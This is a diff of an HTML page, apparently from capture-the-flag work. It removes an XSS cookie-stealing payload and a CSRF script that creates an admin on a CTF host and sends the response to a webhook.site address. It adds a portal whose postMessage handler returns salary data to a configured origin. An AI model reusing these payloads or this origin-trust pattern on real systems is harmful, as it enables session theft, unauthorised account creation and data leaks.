@@ -1,25 +1,43 @@
 <!DOCTYPE html>
 <html>
-                <body>
+    <body>
 
-                    <!-- <a href="https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q=" target="frame" id="link">Go to admin login</a>
-                    <!-- <img src="x" onerror="fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie)" alt=""> -->
-       
-<script>
-fetch('https://tasks.goidactf.ru:20079/create_admin',
-{
-    method:'POST',
-    headers:{
-        'Access-Control-Allow-Origin':'*',
-        'Content-Type': 'application/x-www-form-urlencoded'
-        },
-    credentials:'include',
-    mode:'no-cors',
-    body:'new_admin_login=juuzo'
-}).then(r=>r.text()).then(text=>fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+text).then(r=>r.text()).then(d=>console.log(d)))
+    <div class="feedback-container" id="feedbackContainer">
+        <iframe src="http://feedback.duckerz.ru/widget" title="Feedback Widget"></iframe>
+    </div>
 
+    <!-- Secure Communication Script Config -->
+    <div id="dashboard-config" data-trusted-origin="https://anyquestions69.github.io" style="display:none;"></div>
+
+        <script>    
+    document.addEventListener("DOMContentLoaded", function () {
+    const container = document.getElementById('dashboard-config');
+    if (!container) return;
+
+    const TRUSTED_ORIGIN = container.dataset.trustedOrigin;
+    console.log("Portal: Configured to trust", TRUSTED_ORIGIN);
+
+    window.addEventListener("message", function (event) {
+        if (event.origin !== TRUSTED_ORIGIN) {
+            return;
+        }
+
+        console.log("Portal received trusted message:", event.data);
+
+        if (event.data.type === 'REQUEST_USER_NAME') {
+            fetch('/api/salary')
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Portal: Sending data back to widget");
+                    event.source.postMessage({
+                        type: 'SALARY_DATA',
+                        payload: data
+                    }, event.origin);
+                })
+                .catch(err => console.error("Error fetching salary:", err));
+        }
+    });
+});
 </script>
-
-
-                </body>
+    </body>
 </html>
